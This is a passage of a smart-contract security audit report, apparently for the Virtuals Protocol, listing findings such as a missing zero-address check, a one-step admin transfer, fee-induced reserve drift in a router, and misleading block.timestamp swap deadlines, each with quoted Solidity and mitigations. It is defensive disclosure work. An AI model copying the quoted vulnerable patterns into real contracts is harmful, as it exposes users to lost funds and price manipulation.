<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">token</span><span class="mtk1">.</span><span class="mtk11">safeTransferFrom</span><span class="mtk1">(</span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk12">agentTba</span><span class="mtk1">, </span><span class="mtk12">amounts</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">]);</span></span></span></code></pre>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/ba460bcbc56555f0c4f270c04e9c2375274059d1/contracts/AgentInference.sol#L82-L87">AgentInference.sol#L82-L87</a></p>
<pre data-index="131" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// In promptMulti() function</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">agentId</span><span class="mtk1"> = </span><span class="mtk12">agentIds</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">prevAgentId</span><span class="mtk1"> != </span><span class="mtk12">agentId</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">agentTba</span><span class="mtk1"> = </span><span class="mtk12">agentNft</span><span class="mtk1">.</span><span class="mtk11">virtualInfo</span><span class="mtk1">(</span><span class="mtk12">agentId</span><span class="mtk1">).</span><span class="mtk12">tba</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">token</span><span class="mtk1">.</span><span class="mtk11">safeTransferFrom</span><span class="mtk1">(</span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk12">agentTba</span><span class="mtk1">, </span><span class="mtk12">amounts</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">]);</span></span></span></code></pre>
<h3 style="position:relative;" id="recommended-mitigation-steps-33"><a class="anchor before" aria-label="recommended mitigation steps 33 permalink" href="#recommended-mitigation-steps-33"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Add validation checks to ensure the agent ID exists and the TBA address is not the zero address before transferring tokens:</p>
<pre data-index="132" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// Inside both prompt() and promptMulti() functions</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">agentTba</span><span class="mtk1"> = </span><span class="mtk12">agentNft</span><span class="mtk1">.</span><span class="mtk11">virtualInfo</span><span class="mtk1">(</span><span class="mtk12">agentId</span><span class="mtk1">).</span><span class="mtk12">tba</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">agentTba</span><span class="mtk1"> != </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk8">"Invalid agentId"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">token</span><span class="mtk1">.</span><span class="mtk11">safeTransferFrom</span><span class="mtk1">(</span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk12">agentTba</span><span class="mtk1">, </span><span class="mtk12">amounts</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">]);</span></span></span></code></pre>
<p>This simple check will prevent tokens from being accidentally burned due to invalid agent IDs, protecting users from permanent loss of funds.</p>
<h2 style="position:relative;" id="04-risky-one-step-admin-transfer-in-contributionnftsol"><a class="anchor before" aria-label="04 risky one step admin transfer in contributionnftsol permalink" href="#04-risky-one-step-admin-transfer-in-contributionnftsol"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>[04] Risky one-step admin transfer in <code>ContributionNft.sol</code></h2>
<p>The <code>ContributionNft</code> contract implements a one-step admin transfer pattern via the <code>setAdmin</code> function:</p>
<pre data-index="133" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">setAdmin</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">newAdmin</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk11">_msgSender</span><span class="mtk1">() == </span><span class="mtk12">_admin</span><span class="mtk1">, </span><span class="mtk8">"Only admin can set admin"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">_admin</span><span class="mtk1"> = </span><span class="mtk12">newAdmin</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>This approach is risky because it allows the current admin to immediately and irreversibly transfer admin rights to any address in a single transaction. If the admin address is mistyped, set to an address incapable of transaction signing, or set to the zero address, the contract’s admin privileges can be permanently lost. There is no confirmation or acceptance required from the new admin, increasing the risk of accidental or malicious loss of control.</p>
<h3 style="position:relative;" id="impact-18"><a class="anchor before" aria-label="impact 18 permalink" href="#impact-18"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<ul>
<li>Permanent loss of admin privileges if the address is set incorrectly.</li>
<li>No guarantee that the new admin can or will manage the contract.</li>
<li>No way to recover admin rights if transferred to an invalid address.</li>
</ul>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/contribution/ContributionNft.sol#L103-L106">ContributionNft.sol#L103-L106</a></p>
<pre data-index="134" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">setAdmin</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">newAdmin</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk11">_msgSender</span><span class="mtk1">() == </span><span class="mtk12">_admin</span><span class="mtk1">, </span><span class="mtk8">"Only admin can set admin"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">_admin</span><span class="mtk1"> = </span><span class="mtk12">newAdmin</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<h3 style="position:relative;" id="recommended-mitigation-steps-34"><a class="anchor before" aria-label="recommended mitigation steps 34 permalink" href="#recommended-mitigation-steps-34"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Adopt a two-step admin transfer process, similar to OpenZeppelin’s <code>Ownable2Step</code> pattern. This involves:</p>
<ol>
<li>The current admin proposes a new admin address (<code>transferAdmin</code>).</li>
<li>The new admin must explicitly accept the role in a separate transaction (<code>acceptAdmin</code>).</li>
</ol>
<p>This ensures that admin control is only transferred to an address that is able and willing to accept the role, and prevents accidental or malicious loss of admin privileges.</p>
<h3 style="position:relative;" id="example-mitigation"><a class="anchor before" aria-label="example mitigation permalink" href="#example-mitigation"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Example mitigation</h3>
<pre data-index="135" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">private</span><span class="mtk1"> </span><span class="mtk12">_pendingAdmin</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">transferAdmin</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">newAdmin</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk11">_msgSender</span><span class="mtk1">() == </span><span class="mtk12">_admin</span><span class="mtk1">, </span><span class="mtk8">"Only admin can transfer admin"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">newAdmin</span><span class="mtk1"> != </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk8">"New admin cannot be zero address"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">_pendingAdmin</span><span class="mtk1"> = </span><span class="mtk12">newAdmin</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// Emit event for the pending transfer</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">acceptAdmin</span><span class="mtk1">() </span><span class="mtk11">public</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk11">_msgSender</span><span class="mtk1">() == </span><span class="mtk12">_pendingAdmin</span><span class="mtk1">, </span><span class="mtk8">"Only pending admin can accept role"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">_admin</span><span class="mtk1"> = </span><span class="mtk12">_pendingAdmin</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">_pendingAdmin</span><span class="mtk1"> = </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// Emit event for the completed transfer</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>This pattern ensures that admin rights are only transferred to a valid and responsive address, reducing the risk of accidental or permanent loss of control.</p>
<h2 style="position:relative;" id="05-fee-induced-reserve-inconsistency-in-frouter"><a class="anchor before" aria-label="05 fee induced reserve inconsistency in frouter permalink" href="#05-fee-induced-reserve-inconsistency-in-frouter"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>[05] Fee-induced reserve inconsistency in <code>FRouter</code></h2>
<p>In the <code>FRouter</code> contract, swap fees are deducted from the output amount after the swap amount is calculated using the reserves, but these fees are not accounted for in the reserve updates. This creates a discrepancy between the protocol’s internal reserve accounting and the actual token balances held by the pair contract after each trade.</p>
<h3 style="position:relative;" id="root-cause-1"><a class="anchor before" aria-label="root cause 1 permalink" href="#root-cause-1"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Root cause</h3>
<ul>
<li>The router calculates the swap output using the reserves and then deducts the fee from the output amount, transferring the fee separately to the tax vault.</li>
<li>However, the pair contract’s reserves are updated based on the pre-fee output, not the net output actually received by the user.</li>
</ul>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/fun/FRouter.sol#L113-L124">FRouter.sol#L113-L124</a></p>
<pre data-index="136" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amountOut</span><span class="mtk1"> = </span><span class="mtk11">getAmountsOut</span><span class="mtk1">(</span><span class="mtk12">tokenAddress</span><span class="mtk1">, </span><span class="mtk12">assetToken</span><span class="mtk1">, </span><span class="mtk12">amountIn</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">fee</span><span class="mtk1"> = </span><span class="mtk12">factory</span><span class="mtk1">.</span><span class="mtk11">sellTax</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">txFee</span><span class="mtk1"> = (</span><span class="mtk12">fee</span><span class="mtk1"> * </span><span class="mtk12">amountOut</span><span class="mtk1">) / </span><span class="mtk7">100</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1"> = </span><span class="mtk12">amountOut</span><span class="mtk1"> - </span><span class="mtk12">txFee</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">feeTo</span><span class="mtk1"> = </span><span class="mtk12">factory</span><span class="mtk1">.</span><span class="mtk11">taxVault</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">pair</span><span class="mtk1">.</span><span class="mtk11">transferAsset</span><span class="mtk1">(</span><span class="mtk12">to</span><span class="mtk1">, </span><span class="mtk12">amount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">pair</span><span class="mtk1">.</span><span class="mtk11">transferAsset</span><span class="mtk1">(</span><span class="mtk12">feeTo</span><span class="mtk1">, </span><span class="mtk12">txFee</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">pair</span><span class="mtk1">.</span><span class="mtk11">swap</span><span class="mtk1">(</span><span class="mtk12">amountIn</span><span class="mtk1">, </span><span class="mtk7">0</span><span class="mtk1">, </span><span class="mtk7">0</span><span class="mtk1">, </span><span class="mtk12">amountOut</span><span class="mtk1">);</span></span></span></code></pre>
<h3 style="position:relative;" id="impact-19"><a class="anchor before" aria-label="impact 19 permalink" href="#impact-19"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<ul>
<li>The reserves recorded by the pair contract may diverge from the actual token balances after repeated trades, leading to inaccurate price calculations and potential arbitrage opportunities.</li>
<li>Over time, this could degrade the integrity of the AMM’s pricing and reserve logic, especially if fees are significant or trading volume is high.</li>
</ul>
<h3 style="position:relative;" id="recommended-mitigation-steps-35"><a class="anchor before" aria-label="recommended mitigation steps 35 permalink" href="#recommended-mitigation-steps-35"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>To maintain reserve consistency, fees should be deducted before calculating the swap output and updating reserves. This ensures that the reserves always match the actual balances and reflect the true state of the pool. For example, the fee can be incorporated into the amount calculation or deducted from the input before calling the swap, so that the pair’s reserve update logic remains accurate.</p>
<h2 style="position:relative;" id="06-duplicate-import-statement-for-agentfactoryv3sol-in-fgenesissol"><a class="anchor before" aria-label="06 duplicate import statement for agentfactoryv3sol in fgenesissol permalink" href="#06-duplicate-import-statement-for-agentfactoryv3sol-in-fgenesissol"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>[06] Duplicate import statement for <code>AgentFactoryV3.sol</code> in <code>FGenesis.sol</code></h2>
<p>In <code>FGenesis.sol</code>, the module <code>AgentFactoryV3.sol</code> is imported twice at the top of the file:</p>
<pre data-index="137" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> </span><span class="mtk8">"../virtualPersona/AgentFactoryV3.sol"</span><span class="mtk1">; </span><span class="mtk3">// Line 8</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> </span><span class="mtk8">"../virtualPersona/AgentFactoryV3.sol"</span><span class="mtk1">; </span><span class="mtk3">// Line 11</span></span></span></code></pre>
<p>This duplication is unnecessary and could lead to confusion for maintainers or reviewers. While it does not directly impact contract functionality or security, it is a code quality issue that can be easily avoided. Redundant imports may also introduce ambiguity if the file is refactored in the future or if conditional compilation is used.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-36"><a class="anchor before" aria-label="recommended mitigation steps 36 permalink" href="#recommended-mitigation-steps-36"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Remove the redundant import statement so that <code>AgentFactoryV3.sol</code> is imported only once at the top of the contract file.</p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/genesis/FGenesis.sol#L8-L11">FGenesis.sol#L8-L11</a></p>
<pre data-index="138" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> </span><span class="mtk8">"../virtualPersona/AgentFactoryV3.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">...</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> </span><span class="mtk8">"../virtualPersona/AgentFactoryV3.sol"</span><span class="mtk1">;</span></span></span></code></pre>
<h2 style="position:relative;" id="07-misconception-in-using-blocktimestamp--x-for-swap-deadlines"><a class="anchor before" aria-label="07 misconception in using blocktimestamp  x for swap deadlines permalink" href="#07-misconception-in-using-blocktimestamp--x-for-swap-deadlines"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>[07] Misconception in using <code>block.timestamp + X</code> for swap deadlines</h2>
<p>A common misconception in DeFi contracts is that setting a swap deadline as <code>block.timestamp + X</code> (e.g., <code>block.timestamp + 5 minutes</code>) ensures the transaction is only valid for a real-world time window after the user initiates it. This pattern is used in both <code>UniswapV2Router02</code> and <code>AgentTax.sol</code>:</p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/tax/AgentTax.sol#L227-L228">AgentTax.sol#L227-L228</a></p>
<pre data-index="139" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk11">IUniswapV2Router02</span><span class="mtk1">(</span><span class="mtk12">swapRouter</span><span class="mtk1">).</span><span class="mtk12">swapExactETHForTokensSupportingFeeOnTransferTokens</span><span class="mtk1">{value: </span><span class="mtk12">msg</span><span class="mtk1">.</span><span class="mtk12">value</span><span class="mtk1">}(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">minAmountOut</span><span class="mtk1">, </span><span class="mtk12">path</span><span class="mtk1">, </span><span class="mtk12">msg</span><span class="mtk1">.</span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk12">block</span><span class="mtk1">.</span><span class="mtk12">timestamp</span><span class="mtk1"> + </span><span class="mtk7">5</span><span class="mtk1"> </span><span class="mtk12">minutes</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// AgentTax.sol</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">router</span><span class="mtk1">.</span><span class="mtk11">swapExactTokensForTokens</span><span class="mtk1">(</span><span class="mtk12">amountToSwap</span><span class="mtk1">, </span><span class="mtk12">minOutput</span><span class="mtk1">, </span><span class="mtk12">path</span><span class="mtk1">, </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">), </span><span class="mtk12">block</span><span class="mtk1">.</span><span class="mtk12">timestamp</span><span class="mtk1"> + </span><span class="mtk7">300</span><span class="mtk1">);</span></span></span></code></pre>
<p>However, <code>block.timestamp</code> reflects the timestamp of the block in which the transaction is included, not when it was submitted. As a result, if a transaction is submitted at time <code>T0</code> but only included in a block at <code>T0 + 1 hour</code>, the deadline will still be valid as long as the block’s timestamp is less than the deadline. This means the window is relative to block inclusion, not user intent.</p>
<h3 style="position:relative;" id="impact-20"><a class="anchor before" aria-label="impact 20 permalink" href="#impact-20"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<ul>
<li>Users and developers may believe they are enforcing a strict real-world window for transaction validity, but in reality, the transaction may be included much later than intended.</li>
<li>This can lead to unexpected execution, stale pricing, or MEV exploitation if the transaction sits in the mempool for an extended period.</li>
</ul>
